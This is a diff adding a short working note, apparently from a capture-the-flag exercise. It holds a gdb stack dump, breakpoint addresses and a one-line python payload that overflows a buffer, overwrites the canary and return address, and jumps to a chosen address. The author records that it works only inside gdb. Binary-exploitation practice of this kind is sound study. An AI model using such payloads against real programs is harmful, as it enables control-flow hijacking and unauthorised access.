@@ -1,0 +1,26 @@
+MAX_P_LEN = 64
+0x0804882d # changing this value will segfault
+0x08048831 # this is our destimation
+
+
+0xffffd4c0:     0xffffd4ec      0x00000020      0xffffd4dc      0x08048757
+0xffffd4d0:     0x00000001      0x00000020      0x0000000a      0xccdd1652
+0xffffd4e0:     0xdedae858      0x5e075652      0xda42f677      0x41414141
+0xffffd4f0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd500:     0x41414141      0x41414141      0x41414141      0xb2fac60a
+0xffffd510:     0xf7dd03fc      0x0804a000      0xffffd538      0x0804882d
+0xffffd520:     0x00000001      0xffffd5e4      0xffffd5ec      0x08048911
+0xffffd530:     0xffffd550      0x00000000      0x00000000      0xf7c10e81
+0xffffd540:     0xf7dd0000      0xf7dd0000      0x00000000      0xf7c10e81
+0xffffd550:     0x00000001      0xffffd5e4      0xffffd5ec      0xffffd574
+
+b *0x080487ff
+r < <(python -c "print 'A'*32 + 'B'*4 + '\xfc\x03\xdd\xf7' + '\x00\xa0\x04\x08' + '\x38\xd5\xff\xff' + '\x31\x88\x04\x08' + '\n'*3")
+x/28wx $esp
+ *0x08048806
+
+he command above leads to the desired result in gdb but cant out the contents of the flag-file because of missing privileges when running in gdb
+the break and jump addresses may vary a little
+when the same payload with a real canary is inserted in a python script a segfault occurs...
+
+it seems like one of the words between our buffer and ebp is not the same as in gdb
